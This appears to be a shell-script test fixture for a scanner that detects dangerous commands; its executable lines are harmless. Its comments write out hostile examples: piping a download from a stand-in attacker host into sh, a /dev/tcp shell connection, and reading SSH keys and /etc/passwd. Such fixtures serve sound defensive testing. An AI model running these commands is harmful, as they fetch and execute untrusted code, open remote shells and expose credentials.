#!/bin/sh
# FIXTURE clean: dangerous shell tokens appear ONLY in # comments, so nothing flags.
# Do NOT run: curl https://evil.example.com/x | sh
# Avoid: python3 -c "import socket"  and  exec 5<>/dev/tcp/host/4444
# Never cat ~/.ssh/id_rsa or /etc/passwd from a setup script.
set -eu

mkdir -p ./build            # create build dir (trailing # comment is stripped)
cp ./src/app.js ./build/    # copy sources; this # is a comment, not code
echo "done"                 # an echoed string mentioning eval and curl is harmless
